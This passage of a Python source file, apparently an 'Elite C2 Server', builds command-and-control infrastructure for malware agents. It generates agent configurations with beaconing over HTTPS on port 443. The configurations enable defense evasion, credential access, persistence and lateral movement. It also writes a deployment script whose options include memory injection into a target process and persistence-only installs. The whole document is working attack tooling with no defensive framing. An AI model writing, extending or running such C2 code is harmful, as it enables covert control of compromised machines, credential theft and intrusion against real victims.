                "X-API-Key": api_key or "default-key",
                "Content-Type": "application/json",
                "Accept": "application/json"
            },
            "encryption": {
                "enabled": True,
                "public_key": "",  # For asymmetric encryption
                "session_key": ""  # Will be generated at runtime
            }
        },
        "capabilities": {
            "file_operations": True,
            "process_operations": True,
            "registry_operations": True,
            "network_operations": True,
            "persistence_operations": True,
            "defense_evasion": True,
            "credential_access": True,
            "lateral_movement": True
        },
        "limits": {
            "max_file_size": 10485760,  # 10MB
            "max_command_time": 300,  # 5 minutes
            "max_beacon_size": 102400  # 100KB
        }
    }
    
    if api_key:
        config["communication"]["headers"]["X-API-Key"] = api_key
    
    return config

def create_agent_deployment_script(c2_url: str, api_key: str = None):
    """Create a deployment script for the agent"""
    script = f'''#!/usr/bin/env python3
"""
Agent Deployment Script for C2: {c2_url}
"""

import os
import sys
import json
import base64
import subprocess

# Configuration
C2_URL = "{c2_url}"
API_KEY = "{api_key or 'your-api-key-here'}"

CONFIG = {json.dumps(generate_agent_config(c2_url, api_key), indent=2)}

def deploy():
    """Deploy agent to target system"""
    print(f"Deploying agent to connect to: {{C2_URL}}")
    
    # Create config file
    with open('agent_config.json', 'w') as f:
        json.dump(CONFIG, f, indent=2)
    
    print("Configuration saved to agent_config.json")
    
    # Instructions for deployment
    print("\\nDeployment Options:")
    print("1. Direct execution:")
    print("   python agent.py --config agent_config.json")
    print()
    print("2. Memory injection:")
    print("   python agent.py --inject <PID> agent_config.json")
    print()
    print("3. Persistence only:")
    print("   python agent.py --persistence agent_config.json")
    print()
    print("4. Generate standalone agent:")
    print("   python agent.py --generate standalone_agent.py agent_config.json")

if __name__ == "__main__":
    deploy()
'''
    
    with open('deploy_agent.py', 'w') as f:
        f.write(script)
    
    print(f"[+] Deployment script created: deploy_agent.py")
    print(f"[+] C2 Server URL: {c2_url}")
    if api_key:
        print(f"[+] API Key: {api_key}")

# ============================================================================
# MAIN ENTRY POINT
# ============================================================================

def main():
    """Main entry point for C2 server setup"""
    import argparse
    
    parser = argparse.ArgumentParser(description='Elite C2 Server Setup')
    parser.add_argument('--setup', action='store_true', help='Setup new C2 server')
    parser.add_argument('--start', action='store_true', help='Start C2 server')
    parser.add_argument('--host', default='0.0.0.0', help='Server host (default: 0.0.0.0)')
    parser.add_argument('--port', type=int, default=443, help='Server port (default: 443)')
    parser.add_argument('--url', help='C2 server URL for agent configuration')
    parser.add_argument('--api-key', help='API key for agent authentication')
    parser.add_argument('--generate-agent', action='store_true', help='Generate agent config')
    parser.add_argument('--generate-web', action='store_true', help='Generate web interface')
    parser.add_argument('--ssl-cert', help='SSL certificate path')
    parser.add_argument('--ssl-key', help='SSL key path')
    
    args = parser.parse_args()
    
    if args.setup:
        # Setup new C2 server
        print("[+] Setting up new C2 server...")
        
        # Generate SSL certificates
        generate_ssl_certificates()
        
        # Generate server config
        config = generate_server_config()
        with open('server_config.json', 'w') as f:
            json.dump(config, f, indent=2)
        
        print("[+] Server configuration saved: server_config.json")
        print("[+] SSL certificates generated: server.crt, server.key")
        
        # Generate web interface
        if args.generate_web:
            create_web_interface()
        
        print("\n[+] Setup complete!")
        print("    Start server: python c2_server.py --start")
        print("    Generate agent config: python c2_server.py --generate-agent --url https://your-domain.com")
    
    elif args.start:
        # Start C2 server
        print("[+] Starting C2 server...")
        
        # Load config
        if os.path.exists('server_config.json'):
            with open('server_config.json', 'r') as f:
                config = json.load(f)
        else:
            config = generate_server_config()
        
        # Create server
        server = C2Server(config)
        
        # Setup SSL context
        ssl_context = None
        if args.ssl_cert and args.ssl_key:
            if os.path.exists(args.ssl_cert) and os.path.exists(args.ssl_key):
                ssl_context = (args.ssl_cert, args.ssl_key)
        elif os.path.exists('server.crt') and os.path.exists('server.key'):
            ssl_context = ('server.crt', 'server.key')
        
        # Generate web interface if requested
        if args.generate_web and not os.path.exists('dashboard.html'):
            create_web_interface()
        
        # Start server
        server.start(host=args.host, port=args.port, ssl_context=ssl_context)
    
    elif args.generate_agent and args.url:
        # Generate agent configuration
        print(f"[+] Generating agent configuration for C2: {args.url}")
        
        # Generate config
        config = generate_agent_config(args.url, args.api_key)
        
        # Save config
        with open('agent_config.json', 'w') as f:
            json.dump(config, f, indent=2)
        
        # Create deployment script
        create_agent_deployment_script(args.url, args.api_key)
        
        print("\n[+] Agent configuration generated!")
        print(f"    Config file: agent_config.json")
        print(f"    Deployment script: deploy_agent.py")
        print(f"\n    C2 Endpoint: {args.url}/api/beacon")
        if args.api_key:
            print(f"    API Key: {args.api_key}")
    
    elif args.generate_web:
        # Generate web interface only
        create_web_interface()
    
    else:
        print("""
Elite C2 Server Management
==========================

Commands:
  --setup                 Setup new C2 server with SSL certificates
  --start                 Start the C2 server
  --host <ip>             Server host (default: 0.0.0.0)
  --port <port>           Server port (default: 443)
  --generate-agent --url <url>  Generate agent config for C2 URL
  --api-key <key>         API key for agent authentication
  --generate-web          Generate web interface dashboard
  --ssl-cert <path>       SSL certificate path
  --ssl-key <path>        SSL key path

Examples:
  1. Setup new C2 server:
     python c2_server.py --setup --generate-web
  
  2. Start server:
     python c2_server.py --start --host 0.0.0.0 --port 8443
  
  3. Generate agent config:
     python c2_server.py --generate-agent --url https://your-c2.com --api-key your-secret-key
  
  4. Start with custom SSL:
     python c2_server.py --start --ssl-cert /path/to/cert.crt --ssl-key /path/to/key.key
        """)

if __name__ == "__main__":
    # Check for required dependencies
    if not HAS_FLASK:
        print("Installing required dependencies...")
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'flask', 'flask-cors', 'flask-limiter'])
        
        # Reload imports
        from flask import Flask, request, jsonify, make_response, abort, Response
        from flask_cors import CORS
        from flask_limiter import Limiter
        from flask_limiter.util import get_remote_address
    
    main()
